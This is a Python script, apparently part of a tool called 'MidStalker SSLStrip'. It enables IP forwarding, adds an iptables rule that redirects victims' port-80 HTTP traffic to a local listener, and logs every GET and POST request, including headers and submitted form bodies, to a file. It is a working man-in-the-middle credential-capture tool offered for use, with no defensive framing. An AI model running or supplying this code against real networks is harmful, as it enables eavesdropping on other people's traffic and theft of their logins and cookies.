from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import logging
import os
import time

# === Setup Logging ===
logging.basicConfig(
    filename="sslstrip_http_log.txt",
    level=logging.INFO,
    format="%(asctime)s - %(message)s"
)

# === System Setup ===
def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def set_iptables():
    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")

# === HTTP Interceptor ===
class SSLStripInterceptor(BaseHTTPRequestHandler):
    def do_GET(self):
        logging.info(f"GET {self.path}\nHeaders:\n{self.headers}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"<h1>Logged by MidStalker SSLStrip</h1>")

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        logging.info(f"POST {self.path}\nHeaders:\n{self.headers}\nData:\n{post_data.decode(errors='ignore')}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"<h1>Logged POST by MidStalker SSLStrip</h1>")

# === Launch Proxy ===
def run_sslstrip_proxy():
    try:
        httpd = HTTPServer(('', 8080), SSLStripInterceptor)
        print("[*] SSLStrip Proxy running on port 8080...")
        httpd.serve_forever()
    except OSError:
        print("[!] Port 8080 already in use. Stop the conflicting process or change the port.")

# === Main Entry ===
def start_sslstrip():
    enable_ip_forwarding()
    set_iptables()

    threading.Thread(target=run_sslstrip_proxy, daemon=True).start()
    print("[*] strip.py is intercepting HTTP traffic... Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n[*] Exiting strip.py cleanly...")

# === Run Directly ===
if __name__ == "__main__":
    start_sslstrip()
